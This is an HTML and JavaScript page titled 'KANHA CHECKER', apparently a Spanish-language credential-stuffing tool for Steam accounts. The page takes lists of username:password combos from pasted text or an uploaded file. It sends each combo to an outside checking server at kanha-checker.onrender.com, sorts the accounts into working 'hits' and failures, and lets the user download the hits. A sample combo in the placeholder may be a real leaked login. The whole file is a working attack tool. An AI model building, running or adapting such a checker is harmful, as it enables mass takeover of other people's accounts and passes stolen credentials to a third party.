<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>KANHA CHECKER MULTI</title>
    <style>
        body { background: #0a0a0a; color: #0f0; font-family: monospace; text-align: center; padding: 20px; }
        .tabs { display: flex; justify-content: center; margin-bottom: 20px; gap: 10px; flex-wrap: wrap; }
        .tab { background: #111; color: #0f0; border: 1px solid #0f0; padding: 10px 15px; cursor: pointer; font-family: monospace; font-weight: bold; }
        .tab.active { background: #0f0; color: #000; }
        
        input[type="file"] { display: none; }
        .file-label { background: #111; color: #0f0; border: 1px dashed #0f0; padding: 10px 20px; cursor: pointer; display: inline-block; margin-bottom: 10px; font-weight: bold; }
        .file-label:hover { background: #0f0; color: #000; }

        textarea { width: 90%; max-width: 500px; height: 120px; padding: 12px; margin: 5px 0; background: #111; color: #0f0; border: 1px solid #0f0; font-family: monospace; font-size: 14px; }
        button.check { background: #0f0; color: #000; padding: 12px 30px; font-weight: bold; border: none; margin-top: 10px; cursor: pointer; font-size: 16px; }
        button.download { background: #00f; color: #fff; padding: 10px 20px; font-weight: bold; border: none; margin-top: 20px; cursor: pointer; font-size: 14px; display: none; }
        
        .progress-container { width: 90%; max-width: 500px; background: #333; border-radius: 10px; margin: 20px auto; height: 20px; overflow: hidden; border: 1px solid #0f0; }
        #progressBar { height: 100%; width: 0%; background: #0f0; transition: width 0.2s; }
        #progressText { margin-top: 5px; font-weight: bold; }
        
        .lists-container { display: flex; flex-direction: column; align-items: center; gap: 15px; width: 100%; max-width: 600px; margin: 0 auto; }
        .list-box { width: 100%; background: #111; padding: 15px; border: 1px solid #333; text-align: left; max-height: 200px; overflow-y: auto; font-size: 13px; }
        .hit { color: #0f0; margin-bottom: 5px; }
        .bad { color: #f00; margin-bottom: 5px; }
    </style>
</head>
<body>
    <h1>[ KANHA CHECKER ]</h1>
    
    <div class="tabs">
        <button id="tab-steam" class="tab active" onclick="setService('steam')">STEAM</button>
    </div>

    <p>Subí tu archivo .txt o pegá las cuentas acá:</p>
    
    <label for="fileInput" class="file-label">SUBIR ARCHIVO .TXT</label>
    <input type="file" id="fileInput" accept=".txt">
    
    <br>
    <textarea id="combosInput" placeholder="kudon93:DIEP1996&#10;usuario2:pass123"></textarea><br>
    
    <button class="check" onclick="startCheck()">INICIAR CHEQUEO</button>
    
    <div class="progress-container">
        <div id="progressBar"></div>
    </div>
    <div id="progressText">0 / 0</div>

    <div class="lists-container">
        <div class="list-box" id="hitList">
            <strong style="color: #0f0;">=== CUENTAS BUENAS (HITS) ===</strong><br><br>
        </div>
        <div class="list-box" id="badList">
            <strong style="color: #f00;">=== CUENTAS MALAS (BAD) ===</strong><br><br>
        </div>
    </div>

    <button class="download" id="downloadBtn" onclick="downloadHits()">DESCARGAR HITS</button>

    <script>
        let currentService = 'steam';
        let hitsArray = [];

        document.getElementById('fileInput').addEventListener('change', function(e) {
            const file = e.target.files[0];
            if (!file) return;
            
            const reader = new FileReader();
            reader.onload = function(event) {
                document.getElementById('combosInput').value = event.target.result;
            };
            reader.readAsText(file);
        });

        function setService(service) {
            currentService = service;
        }

        async function startCheck() {
            const text = document.getElementById('combosInput').value.trim();
            if (!text) return alert("Poné algo, AGENT man.");
            
            // LIMPIEZA DE ESPACIOS EN BLANCO
            const rawLines = text.split('\n');
            const lines = [];
            for (let line of rawLines) {
                if (!line.includes(':')) continue;
                // Separa por los dos puntos y limpia los espacios de ambos lados
                const parts = line.split(':');
                const user = parts[0].trim();
                const pass = parts.slice(1).join(':').trim(); // El slice por si la clave tiene ":"
                if (user && pass) {
                    lines.push(`${user}:${pass}`);
                }
            }

            const total = lines.length;
            if (total === 0) return alert("Formato incorrecto. Usá usuario:contraseña");

            document.getElementById('progressBar').style.width = '0%';
            document.getElementById('progressText').innerText = `0 / ${total}`;
            document.getElementById('hitList').innerHTML = '<strong style="color: #0f0;">=== CUENTAS BUENAS (HITS) ===</strong><br><br>';
            document.getElementById('badList').innerHTML = '<strong style="color: #f00;">=== CUENTAS MALAS (BAD) ===</strong><br><br>';
            document.getElementById('downloadBtn').style.display = 'none';
            hitsArray = [];

            for (let i = 0; i < total; i++) {
                const combo = lines[i];
                
                try {
                    const res = await fetch("https://kanha-checker.onrender.com/api/check", {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({ service: currentService, combos: [combo] })
                    });
                    const data = await res.json();
                    
                    if (data.results && data.results[0]) {
                        const r = data.results[0];
                        const userPass = `${r.email}:${combo.split(':').slice(1).join(':')}`;
                        
                        if (r.valid) {
                            document.getElementById('hitList').innerHTML += `<div class="hit">[HIT] ${userPass} | ${r.reason}</div>`;
                            hitsArray.push(`${userPass} | ${r.reason}`);
                        } else {
                            document.getElementById('badList').innerHTML += `<div class="bad">[BAD] ${userPass} | ${r.reason}</div>`;
                        }
                    }
                } catch (e) {
                    document.getElementById('badList').innerHTML += `<div class="bad">[ERROR RED] ${combo}</div>`;
                }

                const percent = ((i + 1) / total) * 100;
                document.getElementById('progressBar').style.width = percent + '%';
                document.getElementById('progressText').innerText = `${i + 1} / ${total}`;
            }

            if (hitsArray.length > 0) {
                document.getElementById('downloadBtn').style.display = 'inline-block';
            }
        }

        function downloadHits() {
            if (hitsArray.length === 0) return;
            const blob = new Blob([hitsArray.join('\n')], { type: 'text/plain' });
            const a = document.createElement('a');
            a.href = URL.createObjectURL(blob);
            a.download = 'hits_steam.txt';
            a.click();
        }
    </script>
</body>
</html>
